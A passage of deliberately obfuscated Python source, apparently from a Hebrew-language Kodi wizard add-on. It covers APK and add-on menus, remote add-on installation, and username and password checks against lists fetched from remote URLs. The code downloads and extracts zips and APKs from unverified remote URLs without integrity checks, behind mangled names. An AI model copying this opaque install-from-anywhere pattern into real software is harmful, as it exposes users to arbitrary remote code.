				OOOOOOOOO00OOO00O +=1 #line:2767
			except :#line:2768
				wiz .log ("Error on: %s"%name )#line:2769
		for OOO000OOO00OOO000 ,name ,O0O0O0000O00OO0O0 ,OO0OO0000OO0000O0 in O0000OO00O0O0000O :#line:2771
			if OOO000OOO00OOO000 in ['../','old/']:continue #line:2772
			if not OOO000OOO00OOO000 .endswith ('.apk'):continue #line:2773
			if not OOO000OOO00OOO000 .find ('_')==-1 :continue #line:2774
			try :#line:2775
				OOOO0000000000O0O =name .split ('-')#line:2776
				OO000O0OOOOO00O00 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0000000000O0O [0 ].title (),OOOO0000000000O0O [1 ],OOOO0000000000O0O [2 ],COLOR2 ,O0O0O0000O00OO0O0 .replace (' ',''),COLOR1 ,OO0OO0000OO0000O0 )#line:2777
				OOO00O0OOOOO000OO =urljoin (OOOOO0OOO000000OO ,OOO000OOO00OOO000 )#line:2778
				addFile (OO000O0OOOOO00O00 ,'apkinstall',"%s v%s %s"%(OOOO0000000000O0O [0 ].title (),OOOO0000000000O0O [1 ],OOOO0000000000O0O [2 ]),OOO00O0OOOOO000OO )#line:2779
				OOOOOOOOO00OOO00O +=1 #line:2780
			except :#line:2781
				wiz .log ("Error on: %s"%name )#line:2782
		if OOOOOOOOO00OOO00O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2783
	elif name =='spmc':#line:2784
		O0O0OO0OO000000O0 ='https://github.com/koying/SPMC/releases'#line:2785
		OO0OO00O0000OO0OO =wiz .openURL (O0O0OO0OO000000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2786
		OOOOOOOOO00OOO00O =0 #line:2787
		O000O00OOOO0O00O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0OO00O0000OO0OO )#line:2788
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2790
		for name ,OOO00OO00OO0000O0 in O000O00OOOO0O00O0 :#line:2792
			O00O0O000OO00OOOO =''#line:2793
			O0000OO00O0O0000O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOO00OO00OO0000O0 )#line:2794
			for OO0O000OOOOOO0OOO ,OOO0O0O0O000O0O00 ,OO0OOO00OO0OOOO0O in O0000OO00O0O0000O :#line:2795
				if OO0OOO00OO0OOOO0O .find ('armeabi')==-1 :continue #line:2796
				if OO0OOO00OO0OOOO0O .find ('launcher')>-1 :continue #line:2797
				O00O0O000OO00OOOO =urljoin ('https://github.com',OO0O000OOOOOO0OOO )#line:2798
				break #line:2799
		if OOOOOOOOO00OOO00O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2801
def apkMenu (url =None ):#line:2803
	if url ==None :#line:2804
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2807
	if not APKFILE =='http://':#line:2808
		if url ==None :#line:2809
			O0OOOOO000000000O =wiz .workingURL (APKFILE )#line:2810
			OOO00OOO0OOOOOOO0 =uservar .APKFILE #line:2811
		else :#line:2812
			O0OOOOO000000000O =wiz .workingURL (url )#line:2813
			OOO00OOO0OOOOOOO0 =url #line:2814
		if O0OOOOO000000000O ==True :#line:2815
			O0OO00O00O00O00OO =wiz .openURL (OOO00OOO0OOOOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2816
			OOOOOO0O00OOOOOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO00O00O00O00OO )#line:2817
			if len (OOOOOO0O00OOOOOO0 )>0 :#line:2818
				OOO0O0000000O0OOO =0 #line:2819
				for OO0OOOOO00O000000 ,OO0OO0O0O000OO0OO ,url ,OO0000O00O000O000 ,O0O0OO0OOO0000OOO ,O00000OO00O0O000O ,OO0OOO0O0O0OO000O in OOOOOO0O00OOOOOO0 :#line:2820
					if not SHOWADULT =='true'and O00000OO00O0O000O .lower ()=='yes':continue #line:2821
					if OO0OO0O0O000OO0OO .lower ()=='yes':#line:2822
						OOO0O0000000O0OOO +=1 #line:2823
						addDir ("[B]%s[/B]"%OO0OOOOO00O000000 ,'apk',url ,description =OO0OOO0O0O0OO000O ,icon =OO0000O00O000O000 ,fanart =O0O0OO0OOO0000OOO ,themeit =THEME3 )#line:2824
					else :#line:2825
						OOO0O0000000O0OOO +=1 #line:2826
						addFile (OO0OOOOO00O000000 ,'apkinstall',OO0OOOOO00O000000 ,url ,description =OO0OOO0O0O0OO000O ,icon =OO0000O00O000O000 ,fanart =O0O0OO0OOO0000OOO ,themeit =THEME2 )#line:2827
					if OOO0O0000000O0OOO <1 :#line:2828
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2829
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2830
		else :#line:2831
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2832
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2833
			addFile ('%s'%O0OOOOO000000000O ,'',themeit =THEME3 )#line:2834
		return #line:2835
	else :wiz .log ("[APK Menu] No APK list added.")#line:2836
	setView ('files','viewType')#line:2837
def addonMenu (url =None ):#line:2839
	if not ADDONFILE =='http://':#line:2840
		if url ==None :#line:2841
			O0OO00O0O00O00000 =wiz .workingURL (ADDONFILE )#line:2842
			O0O0O00O0O000O000 =uservar .ADDONFILE #line:2843
		else :#line:2844
			O0OO00O0O00O00000 =wiz .workingURL (url )#line:2845
			O0O0O00O0O000O000 =url #line:2846
		if O0OO00O0O00O00000 ==True :#line:2847
			O0OO0O0O0OOO00OO0 =wiz .openURL (O0O0O00O0O000O000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2848
			OO0O0000O0O00O0OO =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0O0O0OOO00OO0 )#line:2849
			if len (OO0O0000O0O00O0OO )>0 :#line:2850
				O0OO000OOO0O0OO0O =0 #line:2851
				for O0O00O0O00OOO0O00 ,OO0O0OO0000O0O00O ,url ,O00OO0OOOOO0OOO00 ,OOOO0O0OO000O0O00 ,OO0OOOO0O0O00O000 ,OOOOOOO0O000OO000 ,O0OO000O000OO0O00 ,OO00O0O00O0000O00 ,OOOO0OO00OOOOOOOO in OO0O0000O0O00O0OO :#line:2852
					if OO0O0OO0000O0O00O .lower ()=='section':#line:2853
						O0OO000OOO0O0OO0O +=1 #line:2854
						addDir ("[B]%s[/B]"%O0O00O0O00OOO0O00 ,'addons',url ,description =OOOO0OO00OOOOOOOO ,icon =OOOOOOO0O000OO000 ,fanart =O0OO000O000OO0O00 ,themeit =THEME3 )#line:2855
					else :#line:2856
						if not SHOWADULT =='true'and OO00O0O00O0000O00 .lower ()=='yes':continue #line:2857
						try :#line:2858
							OOO000OO000OO0O00 =xbmcaddon .Addon (id =OO0O0OO0000O0O00O ).getAddonInfo ('path')#line:2859
							if os .path .exists (OOO000OO000OO0O00 ):#line:2860
								O0O00O0O00OOO0O00 ="[COLOR green][Installed][/COLOR] %s"%O0O00O0O00OOO0O00 #line:2861
						except :#line:2862
							pass #line:2863
						O0OO000OOO0O0OO0O +=1 #line:2864
						addFile (O0O00O0O00OOO0O00 ,'addoninstall',OO0O0OO0000O0O00O ,O0O0O00O0O000O000 ,description =OOOO0OO00OOOOOOOO ,icon =OOOOOOO0O000OO000 ,fanart =O0OO000O000OO0O00 ,themeit =THEME2 )#line:2865
					if O0OO000OOO0O0OO0O <1 :#line:2866
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2867
			else :#line:2868
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2869
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2870
		else :#line:2871
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2872
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2873
			addFile ('%s'%O0OO00O0O00O00000 ,'',themeit =THEME3 )#line:2874
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2875
	setView ('files','viewType')#line:2876
def addonInstaller (O00O00OOO0000O0OO ,OO00O0000OOOOO0OO ):#line:2878
	if not ADDONFILE =='http://':#line:2879
		O0O00O00O0OO000OO =wiz .workingURL (OO00O0000OOOOO0OO )#line:2880
		if O0O00O00O0OO000OO ==True :#line:2881
			O0O0OO00O00OOOOO0 =wiz .openURL (OO00O0000OOOOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2882
			OO00OOO00O00OOOO0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00O00OOO0000O0OO ).findall (O0O0OO00O00OOOOO0 )#line:2883
			if len (OO00OOO00O00OOOO0 )>0 :#line:2884
				for OOOOOOOOO0OO00O00 ,OO00O0000OOOOO0OO ,O0O00OOO0OO00O0OO ,OO0OOO0OO00OO0O0O ,OOOO0OO0O0OOO000O ,OO000O000O0OOO000 ,O0O0OO00O000OOOO0 ,O000O0O0OOO0000OO ,O0000OOO0O000OO00 in OO00OOO00O00OOOO0 :#line:2885
					if os .path .exists (os .path .join (ADDONS ,O00O00OOO0000O0OO )):#line:2886
						O0O00000O00OOOOOO =['Launch Addon','Remove Addon']#line:2887
						O00O0O000O0O00OOO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0O00000O00OOOOOO )#line:2888
						if O00O0O000O0O00OOO ==0 :#line:2889
							wiz .ebi ('RunAddon(%s)'%O00O00OOO0000O0OO )#line:2890
							xbmc .sleep (1000 )#line:2891
							return True #line:2892
						elif O00O0O000O0O00OOO ==1 :#line:2893
							wiz .cleanHouse (os .path .join (ADDONS ,O00O00OOO0000O0OO ))#line:2894
							try :wiz .removeFolder (os .path .join (ADDONS ,O00O00OOO0000O0OO ))#line:2895
							except :pass #line:2896
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00O00OOO0000O0OO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2897
								removeAddonData (O00O00OOO0000O0OO )#line:2898
							wiz .refresh ()#line:2899
							return True #line:2900
						else :#line:2901
							return False #line:2902
					O0O0O0O00O0OO0000 =os .path .join (ADDONS ,O0O00OOO0OO00O0OO )#line:2903
					if not O0O00OOO0OO00O0OO .lower ()=='none'and not os .path .exists (O0O0O0O00O0OO0000 ):#line:2904
						wiz .log ("Repository not installed, installing it")#line:2905
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00O00OOO0000O0OO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O00OOO0OO00O0OO ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2906
							O0O0OO0O000OO0O00 =wiz .parseDOM (wiz .openURL (OO0OOO0OO00OO0O0O ),'addon',ret ='version',attrs ={'id':O0O00OOO0OO00O0OO })#line:2907
							if len (O0O0OO0O000OO0O00 )>0 :#line:2908
								OO0O0O0OOOOOOOO00 ='%s%s-%s.zip'%(OOOO0OO0O0OOO000O ,O0O00OOO0OO00O0OO ,O0O0OO0O000OO0O00 [0 ])#line:2909
								wiz .log (OO0O0O0OOOOOOOO00 )#line:2910
								if KODIV >=17 :wiz .addonDatabase (O0O00OOO0OO00O0OO ,1 )#line:2911
								installAddon (O0O00OOO0OO00O0OO ,OO0O0O0OOOOOOOO00 )#line:2912
								wiz .ebi ('UpdateAddonRepos()')#line:2913
								wiz .log ("Installing Addon from Kodi")#line:2915
								OOO0000000OOOO0OO =installFromKodi (O00O00OOO0000O0OO )#line:2916
								wiz .log ("Install from Kodi: %s"%OOO0000000OOOO0OO )#line:2917
								if OOO0000000OOOO0OO :#line:2918
									wiz .refresh ()#line:2919
									return True #line:2920
							else :#line:2921
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0O00OOO0OO00O0OO )#line:2922
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00O00OOO0000O0OO ,O0O00OOO0OO00O0OO ))#line:2923
					elif O0O00OOO0OO00O0OO .lower ()=='none':#line:2924
						wiz .log ("No repository, installing addon")#line:2925
						OOO000OO00OOOOOOO =O00O00OOO0000O0OO #line:2926
						O000000OOO00OO000 =OO00O0000OOOOO0OO #line:2927
						installAddon (O00O00OOO0000O0OO ,OO00O0000OOOOO0OO )#line:2928
						wiz .refresh ()#line:2929
						return True #line:2930
					else :#line:2931
						wiz .log ("Repository installed, installing addon")#line:2932
						OOO0000000OOOO0OO =installFromKodi (O00O00OOO0000O0OO ,False )#line:2933
						if OOO0000000OOOO0OO :#line:2934
							wiz .refresh ()#line:2935
							return True #line:2936
					if os .path .exists (os .path .join (ADDONS ,O00O00OOO0000O0OO )):return True #line:2937
					OOOOOO0000O0O000O =wiz .parseDOM (wiz .openURL (OO0OOO0OO00OO0O0O ),'addon',ret ='version',attrs ={'id':O00O00OOO0000O0OO })#line:2938
					if len (OOOOOO0000O0O000O )>0 :#line:2939
						OO00O0000OOOOO0OO ="%s%s-%s.zip"%(OO00O0000OOOOO0OO ,O00O00OOO0000O0OO ,OOOOOO0000O0O000O [0 ])#line:2940
						wiz .log (str (OO00O0000OOOOO0OO ))#line:2941
						if KODIV >=17 :wiz .addonDatabase (O00O00OOO0000O0OO ,1 )#line:2942
						installAddon (O00O00OOO0000O0OO ,OO00O0000OOOOO0OO )#line:2943
						wiz .refresh ()#line:2944
					else :#line:2945
						wiz .log ("no match");return False #line:2946
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2947
		else :wiz .log ("[Addon Installer] Text File: %s"%O0O00O00O0OO000OO )#line:2948
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2949
def installFromKodi (OO0OO00OO00OO0O00 ,over =True ):#line:2951
	if over ==True :#line:2952
		xbmc .sleep (2000 )#line:2953
	wiz .ebi ('RunPlugin(plugin://%s)'%OO0OO00OO00OO0O00 )#line:2955
	if not wiz .whileWindow ('yesnodialog'):#line:2956
		return False #line:2957
	xbmc .sleep (1000 )#line:2958
	if wiz .whileWindow ('okdialog'):#line:2959
		return False #line:2960
	wiz .whileWindow ('progressdialog')#line:2961
	if os .path .exists (os .path .join (ADDONS ,OO0OO00OO00OO0O00 )):return True #line:2962
	else :return False #line:2963
def installAddon (O00O0000OOO000O00 ,O00O00000000OO000 ):#line:2965
	if not wiz .workingURL (O00O00000000OO000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O00O0000OOO000O00 ,COLOR2 ));return #line:2966
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2967
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0000OOO000O00 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2968
	O00OOO0O0O0OOO00O =O00O00000000OO000 .split ('/')#line:2969
	O00000OO000OOOOO0 =os .path .join (PACKAGES ,O00OOO0O0O0OOO00O [-1 ])#line:2970
	try :os .remove (O00000OO000OOOOO0 )#line:2971
	except :pass #line:2972
	downloader .download (O00O00000000OO000 ,O00000OO000OOOOO0 ,DP )#line:2973
	O00O0OOO000O0O00O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0000OOO000O00 )#line:2974
	DP .update (0 ,O00O0OOO000O0O00O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2975
	O00OOOOOO0OO0OO0O ,OO0000O0OOOO0O00O ,O0O0OOOO0O0OOOOO0 =extract .all (O00000OO000OOOOO0 ,ADDONS ,DP ,title =O00O0OOO000O0O00O )#line:2976
	DP .update (0 ,O00O0OOO000O0O00O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2977
	installed (O00O0000OOO000O00 )#line:2978
	installDep (O00O0000OOO000O00 ,DP )#line:2979
	DP .close ()#line:2980
	wiz .ebi ('UpdateAddonRepos()')#line:2981
	wiz .ebi ('UpdateLocalAddons()')#line:2982
	wiz .refresh ()#line:2983
def installDep (OOO00OOO0O0OOOO0O ,DP =None ):#line:2985
	O000O0OOO00OOOO00 =os .path .join (ADDONS ,OOO00OOO0O0OOOO0O ,'addon.xml')#line:2986
	if os .path .exists (O000O0OOO00OOOO00 ):#line:2987
		OOOO0O00O000000OO =open (O000O0OOO00OOOO00 ,mode ='r');O00O0O0OOO00OO000 =OOOO0O00O000000OO .read ();OOOO0O00O000000OO .close ();#line:2988
		O00OO00OO0O000O00 =wiz .parseDOM (O00O0O0OOO00OO000 ,'import',ret ='addon')#line:2989
		for O0000OO0000OOO000 in O00OO00OO0O000O00 :#line:2990
			if not 'xbmc.python'in O0000OO0000OOO000 :#line:2991
				if not DP ==None :#line:2992
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000OO0000OOO000 ))#line:2993
				wiz .createTemp (O0000OO0000OOO000 )#line:2994
def installed (O00OOOOOOOO000000 ):#line:3021
	O0OO0OOO0OO0OO000 =os .path .join (ADDONS ,O00OOOOOOOO000000 ,'addon.xml')#line:3022
	if os .path .exists (O0OO0OOO0OO0OO000 ):#line:3023
		try :#line:3024
			OOOOOO0000OO00OO0 =open (O0OO0OOO0OO0OO000 ,mode ='r');OO00OO000O0OOO00O =OOOOOO0000OO00OO0 .read ();OOOOOO0000OO00OO0 .close ()#line:3025
			OO00O0OOOO0O0OOOO =wiz .parseDOM (OO00OO000O0OOO00O ,'addon',ret ='name',attrs ={'id':O00OOOOOOOO000000 })#line:3026
			O0O00O0O0O0000O00 =os .path .join (ADDONS ,O00OOOOOOOO000000 ,'icon.png')#line:3027
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O0OOOO0O0OOOO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O0O00O0O0O0000O00 )#line:3028
		except :pass #line:3029
def youtubeMenu (url =None ):#line:3031
	if not YOUTUBEFILE =='http://':#line:3032
		if url ==None :#line:3033
			O0OO000OOOO0O0OOO =wiz .workingURL (YOUTUBEFILE )#line:3034
			O0OO0O00OO0O0O00O =uservar .YOUTUBEFILE #line:3035
		else :#line:3036
			O0OO000OOOO0O0OOO =wiz .workingURL (url )#line:3037
			O0OO0O00OO0O0O00O =url #line:3038
		if O0OO000OOOO0O0OOO ==True :#line:3039
			O0OO0OOO00OO00OO0 =wiz .openURL (O0OO0O00OO0O0O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3040
			O00OO0OOOO000OOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO0OOO00OO00OO0 )#line:3041
			if len (O00OO0OOOO000OOOO )>0 :#line:3042
				for OOOOOO000OOOOOOOO ,O00O00O00OO0O000O ,url ,OOOOOOOOO0O000000 ,O00O00OOO0OO00O00 ,OO00O0OOO0OOOO00O in O00OO0OOOO000OOOO :#line:3043
					if O00O00O00OO0O000O .lower ()=="yes":#line:3044
						addDir ("[B]%s[/B]"%OOOOOO000OOOOOOOO ,'youtube',url ,description =OO00O0OOO0OOOO00O ,icon =OOOOOOOOO0O000000 ,fanart =O00O00OOO0OO00O00 ,themeit =THEME3 )#line:3045
					else :#line:3046
						addFile (OOOOOO000OOOOOOOO ,'viewVideo',url =url ,description =OO00O0OOO0OOOO00O ,icon =OOOOOOOOO0O000000 ,fanart =O00O00OOO0OO00O00 ,themeit =THEME2 )#line:3047
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:3048
		else :#line:3049
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:3050
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3051
			addFile ('%s'%O0OO000OOOO0O0OOO ,'',themeit =THEME3 )#line:3052
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:3053
	setView ('files','viewType')#line:3054
def STARTP ():#line:3055
	O000OO0OOOO0O00OO =(ADDON .getSetting ("pass"))#line:3056
	if BUILDNAME =="":#line:3057
	 if not NOTIFY =='true':#line:3058
          OO000OOOOOOO00O00 =wiz .workingURL (NOTIFICATION )#line:3059
	 if not NOTIFY2 =='true':#line:3060
          OO000OOOOOOO00O00 =wiz .workingURL (NOTIFICATION2 )#line:3061
	 if not NOTIFY3 =='true':#line:3062
          OO000OOOOOOO00O00 =wiz .workingURL (NOTIFICATION3 )#line:3063
	O0OO0OO0O0000OOOO =O000OO0OOOO0O00OO #line:3064
	OO000OOOOOOO00O00 =urllib2 .Request (SPEED )#line:3065
	OOO0OOOO0000OOO0O =urllib2 .urlopen (OO000OOOOOOO00O00 )#line:3066
	O000O0OO0O00OO00O =OOO0OOOO0000OOO0O .readlines ()#line:3068
	OOO00000O0O00000O =0 #line:3072
	for O000OOO0OOO000O0O in O000O0OO0O00OO00O :#line:3073
		if O000OOO0OOO000O0O .split (' ==')[0 ]==O000OO0OOOO0O00OO or O000OOO0OOO000O0O .split ()[0 ]==O000OO0OOOO0O00OO :#line:3074
			OOO00000O0O00000O =1 #line:3075
			break #line:3076
	if OOO00000O0O00000O ==0 :#line:3077
					O000OOO0O000O000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3078
					if O000OOO0O000O000O :#line:3080
						ADDON .openSettings ()#line:3082
						sys .exit ()#line:3084
					else :#line:3085
						sys .exit ()#line:3086
	return 'ok'#line:3090
def STARTP2 ():#line:3091
	O0O00O0OOOOOOOOOO =(ADDON .getSetting ("user"))#line:3092
	O0OO0O00OO0OOO0OO =(UNAME )#line:3094
	OOO0OOO0OO0OOO000 =urllib2 .urlopen (O0OO0O00OO0OOO0OO )#line:3095
	O0OO0OO00O0000O0O =OOO0OOO0OO0OOO000 .readlines ()#line:3096
	OOOOOOOO00O00OO00 =0 #line:3097
	for OOOOO0000O00OOO0O in O0OO0OO00O0000O0O :#line:3100
		if OOOOO0000O00OOO0O .split (' ==')[0 ]==O0O00O0OOOOOOOOOO or OOOOO0000O00OOO0O .split ()[0 ]==O0O00O0OOOOOOOOOO :#line:3101
			OOOOOOOO00O00OO00 =1 #line:3102
			break #line:3103
	if OOOOOOOO00O00OO00 ==0 :#line:3104
		O00O00OOO0O0O0O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3105
		if O00O00OOO0O0O0O0O :#line:3107
			ADDON .openSettings ()#line:3109
			sys .exit ()#line:3112
		else :#line:3113
			sys .exit ()#line:3114
	return 'ok'#line:3118
def passandpin ():#line:3119
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:3120
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:3121
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:3122
def passandUsername ():#line:3123
	ADDON .openSettings ()#line:3125
def folderback ():#line:3128
    O0000O00OO0OOO0O0 =ADDON .getSetting ("path")#line:3129
    if O0000O00OO0OOO0O0 :#line:3130
      O0000O00OO0OOO0O0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:3131
      ADDON .setSetting ("path",O0000O00OO0OOO0O0 )#line:3132
def backmyupbuild ():#line:3135
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3139
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3140
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3141
		addFile ('גיבוי הגדרות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3144
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3145
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3147
def maintMenu (view =None ):#line:3151
	OOOOOO0O0OOOOO0OO ='[B][COLOR green]ON[/COLOR][/B]';O0000O00O0OOO00O0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:3153
	OOO000OOO0OO000OO ='true'if AUTOCLEANUP =='true'else 'false'#line:3154
	OO0O0O00OO00O0O00 ='true'if AUTOCACHE =='true'else 'false'#line:3155
	O00O0OO000OOOO0O0 ='true'if AUTOPACKAGES =='true'else 'false'#line:3156
	O00O0O000O000O000 ='true'if AUTOTHUMBS =='true'else 'false'#line:3157
	O00O0000O0OO00OO0 ='true'if SHOWMAINT =='true'else 'false'#line:3158
	OOOOOO0O0O0O0O0OO ='true'if INCLUDEVIDEO =='true'else 'false'#line:3159
	O0O0000O0OO00O0OO ='true'if INCLUDEALL =='true'else 'false'#line:3160
	OOO0O0O0OO0O0OO00 ='true'if THIRDPARTY =='true'else 'false'#line:3161
	if wiz .Grab_Log (True )==False :OOOO0O00000O0OOO0 =0 #line:3162
	else :OOOO0O00000O0OOO0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:3163
	if wiz .Grab_Log (True ,True )==False :OO0O0O00OOOO0O0OO =0 #line:3164
	else :OO0O0O00OOOO0O0OO =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:3165
	OO0OOO000OO00O0O0 =int (OOOO0O00000O0OOO0 )+int (OO0O0O00OOOO0O0OO )#line:3166
	O000O000OO000OOO0 =str (OO0OOO000OO00O0O0 )+' Error(s) Found'if OO0OOO000OO00O0O0 >0 else 'None Found'#line:3167
	O0OOOO00O0O00O0O0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:3168
	if O0O0000O0OO00O0OO =='true':#line:3169
		OO0O000OOO00OOO0O ='true'#line:3170
		OOOOO0O0000000000 ='true'#line:3171
		OO0O0O0O0OOOOOO00 ='true'#line:3172
		OO0O00O000OO0OO00 ='true'#line:3173
		O0O000O00OO0000OO ='true'#line:3174
		OOO0O00000O0O0OO0 ='true'#line:3175
		O0000O00OO000OOOO ='true'#line:3176
		O0OO0OOO00OO0OOO0 ='true'#line:3177
	else :#line:3178
		OO0O000OOO00OOO0O ='true'if INCLUDEBOB =='true'else 'false'#line:3179
		OOOOO0O0000000000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:3180
		OO0O0O0O0OOOOOO00 ='true'if INCLUDESPECTO =='true'else 'false'#line:3181
		OO0O00O000OO0OO00 ='true'if INCLUDEGENESIS =='true'else 'false'#line:3182
		O0O000O00OO0000OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:3183
		OOO0O00000O0O0OO0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:3184
		O0000O00OO000OOOO ='true'if INCLUDESALTS =='true'else 'false'#line:3185
		O0OO0OOO00OO0OOO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:3186
	O00O000000O0000OO =wiz .getSize (PACKAGES )#line:3187
	O000O0O000O0O0O00 =wiz .getSize (THUMBS )#line:3188
	OOOOOOOO00OOOOOO0 =wiz .getCacheSize ()#line:3189
	O000O0OO0000OO00O =O00O000000O0000OO +O000O0O000O0O0O00 +OOOOOOOO00OOOOOO0 #line:3190
	OOOO0000O0O00OO00 =['Daily','Always','3 Days','Weekly']#line:3191
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:3192
	if view =="clean"or SHOWMAINT =='true':#line:3193
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O0OO0000OO00O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:3194
